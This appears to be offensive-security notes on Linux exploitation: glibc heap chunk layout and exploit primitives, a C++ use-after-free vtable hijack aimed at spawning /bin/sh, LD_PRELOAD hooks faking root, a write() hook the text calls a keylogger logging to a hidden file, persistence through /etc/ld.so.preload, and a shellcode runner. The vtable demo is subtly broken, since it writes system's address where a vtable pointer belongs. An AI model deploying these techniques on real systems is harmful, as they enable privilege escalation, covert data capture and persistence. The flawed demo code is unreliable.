Each heap allocation is wrapped in a malloc_chunk:

struct malloc_chunk {
  size_t mchunk_prev_size;  // size of previous chunk if free
  size_t mchunk_size;       // size of this chunk + flags in low 3 bits
  // P (prev_in_use), M (mmap'd), A (non-main arena)
  struct malloc_chunk *fd;  // forward ptr — only when free
  struct malloc_chunk *bk;  // back ptr  — only when free
  // for large chunks:
  struct malloc_chunk *fd_nextsize;
  struct malloc_chunk *bk_nextsize;
};

The user-visible pointer returned by malloc() points 16 bytes into this structure (past prev_size + size).

Key exploitation primitives:

1. **Heap overflow into next chunk's size field** — corrupt the size to trick free() into thinking the chunk is larger, enabling overlap.
2. **Use-after-free + tcache poisoning (glibc ≥ 2.26)** — tcache is a per-thread singly-linked list. After free(), fd points to the next free chunk. If you control a freed chunk, overwrite fd with a target address; subsequent malloc() returns that address.
3. **fastbin dup** — double-free a fastbin chunk to insert it twice, then allocate twice to get a pointer to the same region, then a third time to an arbitrary address.
4. **Unsafe unlink (old glibc)** — forge prev_size and size to satisfy the unlink macro, leading to arbitrary write.

Modern glibc has tcache key (chunk->bk = tcache struct address) to detect double-frees — bypass by clearing the key field before the second free.

// vuln.cpp — g++ -no-pie -fno-stack-protector -o vuln vuln.cpp
#include <cstdlib>
#include <cstdio>
#include <cstring>

class Animal {
public:
    virtual void speak() { puts("..."); }
    char name[24];
};

class Dog : public Animal {
public:
    void speak() override { puts("Woof"); }
};

int main() {
    Dog *d = new Dog();
    d->speak();           // "Woof" — vtable ptr at d[0] points to Dog vtable

    delete d;             // freed — but d still usable (UAF)

    // Allocate same-size chunk; it will reuse freed Dog memory
    char *buf = (char*)malloc(32);
    // Overwrite vtable pointer (first 8 bytes) with address of fake vtable
    uintptr_t fake_vtable[1] = { (uintptr_t)system };
    memcpy(buf, &fake_vtable, 8);
    // Also write "/bin/sh" as the argument (passed in RDI via virtual dispatch)
    strcpy(buf + 8, "/bin/sh");

    d->speak();           // calls system("/bin/sh") via corrupted vtable
    return 0;
}
// In a real scenario you'd get the addresses from a leak (ASLR) and send the
// fake vtable via heap grooming before triggering the UAF.

LD_PRELOAD forces the dynamic linker to load a specified .so before all others, allowing any symbol to be overridden (hijacking).

// hook.c — override getuid() to always return 0
#define _GNU_SOURCE
#include <sys/types.h>
#include <stdio.h>
#include <dlfcn.h>

uid_t getuid(void) {
    printf("[hook] getuid() called — returning 0\n");
    return 0;   // pretend root
}

uid_t geteuid(void) { return 0; }

// build:
// gcc -shared -fPIC -o hook.so hook.c -ldl
// inject:
// LD_PRELOAD=./hook.so id
// → uid=0(root) gid=...

// More powerful: hook write() to intercept all written data (keylogger)
#define _GNU_SOURCE
#include <unistd.h>
#include <dlfcn.h>
#include <stdio.h>

ssize_t write(int fd, const void *buf, size_t count) {
    static ssize_t (*orig_write)(int,const void*,size_t) = NULL;
    if (!orig_write) orig_write = dlsym(RTLD_NEXT, "write");
    if (fd == 1 || fd == 2) {   // stdout/stderr
        FILE *log = fopen("/tmp/.out.log","a");
        if (log) { fwrite(buf, 1, count, log); fclose(log); }
    }
    return orig_write(fd, buf, count);
}

// Persistence without LD_PRELOAD env var: write path to /etc/ld.so.preload
// (requires root, or writable /etc)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

int main() {
    unsigned char buf[4096];
    size_t n = fread(buf, 1, sizeof(buf), stdin);
    if (n == 0) return 1;

    // Allocate RWX page
    void *mem = mmap(NULL, 4096,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANON | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED) { perror("mmap"); return 1; }

    memcpy(mem, buf, n);
    mprotect(mem, 4096, PROT_READ | PROT_EXEC);  // drop write

    // Cast to function pointer and call
    ((void(*)())mem)();
    return 0;
}
